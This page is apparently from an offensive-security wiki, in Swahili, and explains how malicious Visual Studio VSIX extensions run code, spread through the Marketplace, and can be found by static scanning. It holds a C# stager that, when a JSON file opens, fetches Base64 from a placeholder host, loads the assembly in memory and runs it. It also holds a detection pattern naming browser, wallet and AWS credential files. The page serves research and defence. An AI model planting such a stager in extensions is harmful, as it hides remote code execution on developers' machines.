# Matumizi Mabaya ya Kiendelezi cha Visual Studio VSIX

{{#include ../banners/hacktricks-training.md}}

Kiendelezi cha Visual Studio kinaweza kugeuza shughuli za kawaida za kuhariri kuwa utekelezaji wa msimbo kwa utambulisho wa mtumiaji aliyeingia. VSIX hasidi, mchapishaji anayeiga mwingine, au sasisho lililoharibiwa la kiendelezi kinaweza kumfikia mtumiaji kupitia njia za kawaida za usakinishaji. Usakinishaji unaohitaji kidokezo cha msimamizi ni njia ya usakinishaji iliyoidhinishwa, si upandishaji wa haki kiotomatiki.<sup>[[1]](#references)</sup>

## Muundo wa Utekelezaji

Viendelezi vya kawaida vya VSSDK huendeshwa ndani ya `devenv.exe`. Muundo mpya zaidi wa `VisualStudio.Extensibility` huendesha hasa viendelezi vya kisasa vya .NET nje ya mchakato: Visual Studio huelekeza miito kwenye mchakato maalum wa `Microsoft.ServiceHub.Host.Extensibility`, jambo linalotenga uthabiti wa IDE lakini **halizuii** kiendelezi kutumia ruhusa za Windows za mtumiaji. Jina halisi la faili inayotekelezwa linaweza kujumuisha kiambishi tamati cha usanifu, kama vile `ServiceHub.Host.Extensibility.arm64.exe`.<sup>[[1]](#references)[[2]](#references)</sup>

### Kuchochewa na shughuli za kawaida za kuhariri

Badala ya kutoa amri ya menyu inayoonekana wazi pekee, kiendelezi kinaweza kutekeleza `ITextViewOpenClosedListener`. Callback yake ya `TextViewOpenedAsync` huitwa kwa hati zinazolingana, huku `TextViewExtensionConfiguration.AppliesTo` ikiruhusu kuzuia uanzishaji kwa aina inayotumika sana kama JSON. Kifomati au kilinta halisi bado kinaweza kufanya kazi iliyotangazwa huku kitendo cha pili kikitekelezwa kama athari ya pembeni wakati faili inafunguliwa.<sup>[[1]](#references)[[3]](#references)</sup>

Mchoro ufuatao uliopunguzwa unaonyesha sehemu muhimu za utekelezaji; umeacha kifomati halali na ushughulikiaji wa makosa kwa uwazi.<sup>[[1]](#references)[[3]](#references)</sup>

<details>
<summary>Kipakiaji cha assembly inayodhibitiwa ndani ya kumbukumbu kinachochochewa na tukio</summary>

```csharp
[VisualStudioContribution]
internal class JsonListener : ExtensionPart, ITextViewOpenClosedListener
{
    public TextViewExtensionConfiguration TextViewExtensionConfiguration => new()
    {
        AppliesTo = [DocumentFilter.FromDocumentType("json")]
    };

    public async Task TextViewOpenedAsync(ITextViewSnapshot view, CancellationToken ct)
    {
        using var http = new HttpClient();
        var encoded = (await http.GetStringAsync("https://example.invalid/update.txt", ct)).Trim();
        using var stream = new MemoryStream(Convert.FromBase64String(encoded));
        var context = new AssemblyLoadContext(Guid.NewGuid().ToString(), isCollectible: true);
        var entry = context.LoadFromStream(stream).EntryPoint
            ?? throw new InvalidOperationException("Assembly has no entry point");
        var argv = entry.GetParameters().Length == 0 ? null : new object?[] { Array.Empty<string>() };
        if (entry.Invoke(null, argv) is Task task) await task;
        context.Unload();
    }

    public Task TextViewClosedAsync(ITextViewSnapshot view, CancellationToken ct)
        => Task.CompletedTask;
}
```

</details>

Msururu huu hupakua maandishi ya Base64, huyasimbua kuwa byte za assembly, huyapakia kutoka kwenye `MemoryStream` kupitia `AssemblyLoadContext` inayoweza kukusanywa, huendesha `EntryPoint` iliyopatikana kwa reflection ikiwa na vigezo sifuri au `string[]`, husubiri entry point za asynchronous, kisha hupakua context. Hatua ya pili haiandikwi kwenye diski, ingawa VSIX na DLL kuu ya extension hubaki kama mabaki kwenye diski. Base64 haitoi uthibitishaji wala usiri; kutumia HTTP pia huruhusu mshambuliaji aliye kwenye njia kubadilisha jibu.<sup>[[1]](#references)</sup>

Tofauti za kiutendaji ni pamoja na kuficha exceptions zote ili kipengele kilichotangazwa kiendelee kufanya kazi staging inaposhindwa, au kutumia `ITextViewChangedListener` ili kuanzisha utekelezaji baada ya mabadiliko. Msimbo hutekelezwa kwenye extension host na unaweza kutumia managed APIs, P/Invoke, faili, credentials na child processes zinazopatikana kwa mtumiaji huyo.<sup>[[1]](#references)</sup>

Kwa eneo linalohusiana la utekelezaji mahususi kwa editor, linalotegemea native plugin autoloading, tazama:

{{#ref}}
windows-local-privilege-escalation/notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Matumizi mabaya ya uaminifu wa Marketplace na usambazaji

VSIX inaweza kufikishwa kama faili inayoshirikiwa au ya phishing, kutoka Marketplace ya wavuti, au kupitia kivinjari cha Marketplace kilichojengewa ndani ya Visual Studio. Usajili wa publisher unaosisitiza zaidi upekee na orodha ya maneno yaliyohifadhiwa unaweza kuruhusu majina ya publisher yanayofanana kwa muonekano na yanayopotosha; kuathiri publisher au extension ambayo tayari inaaminika kuna ufanisi zaidi kwa sababu hupata msingi wa watumiaji ambao tayari wameisakinisha. Usakinishaji kutoka Marketplace huanzisha Visual Studio Installer na kuweka kwa muda VSIX iliyopakuliwa chini ya `%LOCALAPPDATA%\Temp`; `payload.vsix` hutumika pia kwa matumizi halali, kwa hiyo jina la faili pekee si kiashiria.<sup>[[1]](#references)</sup>

MDSec haikubaini URL protocol ya Visual Studio inayosakinisha extension moja kwa moja. Operator bado anahitaji mtumiaji asakinishe/aiamini VSIX, au lazima aathiri njia ya usambazaji ya extension iliyopo. Package ya `AllUsers` husakinishwa chini ya folda ya usakinishaji ya Visual Studio na inaweza kuomba ruhusa za juu, lakini huu ni utaratibu wa kawaida wa installer unaohitaji idhini, si njia ya moja kwa moja ya kupata haki za administrator au SYSTEM.<sup>[[1]](#references)[[4]](#references)</sup>

### Ukaguzi tuli kwa kiwango kikubwa

Kwa kawaida, packages za VSIX ni kontena za ZIP, kwa hiyo mfumo salama wa kukagua Marketplace unaweza kuorodhesha packages, kuzifungua **bila kupakia msimbo wa extension**, kuchanganua manifests, kutambua maeneo ya utekelezaji, na kutenganisha msimbo wa assemblies za managed kwa kutumia `ilspycmd`. Weka kipaumbele kwenye assemblies zinazomilikiwa na extension baada ya kuondoa dependencies za kawaida zilizounganishwa, kisha linganisha maandishi ya credential-store na makundi ya tabia kama vile kusoma faili pamoja na kutuma kupitia mtandao, kusimba pamoja na kutuma, kupakua pamoja na kutekeleza, kufikia credential-manager pamoja na mtandao, au kupiga screenshot pamoja na kuituma.<sup>[[1]](#references)[[5]](#references)</sup>

```bash
unzip -q sample.vsix -d sample-vsix
find sample-vsix -type f \( -iname '*.dll' -o -iname '*.exe' \) -print
ilspycmd -p -o decompiled sample-vsix/path/to/extension.dll
rg -n -i 'Login Data|logins\.json|key4\.db|wallet\.dat|\.aws[/\\]credentials|LoadFromStream|EntryPoint|cmd\.exe' decompiled
```

Pia orodhesha native DLLs, MSBuild targets, scripts, T4 templates, na installer payloads badala ya kudhani kuwa kila execution surface ni managed code. Linganisha tabia inayotia shaka na madhumuni yanayodaiwa kwenye manifest; telemetry na updaters halali zinaweza kufanana na exfiltration au staging. Ukaguzi wa static pekee hauoni code iliyopakiwa, iliyofichwa, inayotatuliwa dynamically, na isiyotumika, na kukagua toleo la hivi karibuni pekee hukosa releases hasidi za zamani.<sup>[[1]](#references)</sup>

Shambulio tofauti la kupakia project linaweza kutekeleza target hasidi ya [MSBuild `GetFrameworkPaths`](visual-studio-project-msbuild-execution.md) bila kusakinisha VSIX.<sup>[[6]](#references)</sup>

## References

- [1] [MDSec - Viendelezi vya Visual Studio Vimepitiwa Tena](https://www.mdsec.co.uk/2026/05/visual-studio-extensions-revisited/)
- [2] [Microsoft Learn - Kuhusu VisualStudio.Extensibility](https://learn.microsoft.com/en-us/visualstudio/extensibility/visualstudio.extensibility/visualstudio-extensibility?view=visualstudio)
- [3] [Microsoft Learn - ITextViewOpenClosedListener.TextViewOpenedAsync](https://learn.microsoft.com/en-us/dotnet/api/microsoft.visualstudio.extensibility.editor.itextviewopenclosedlistener.textviewopenedasync?view=vs-extensibility)
- [4] [Microsoft Learn - Muundo wa kifurushi cha VSIX](https://learn.microsoft.com/en-us/visualstudio/extensibility/anatomy-of-a-vsix-package?view=visualstudio)
- [5] [ILSpy - zana ya .NET ya ilspycmd](https://github.com/icsharpcode/ILSpy/blob/master/ICSharpCode.ILSpyCmd/README.md)
- [6] [Unit 42 - Kampeni ya Blinder Tunnel Yalenga Miundombinu ya Iraq](https://unit42.paloaltonetworks.com/blinder-tunnel-targets-critical-infrastructure/)
{{#include ../banners/hacktricks-training.md}}
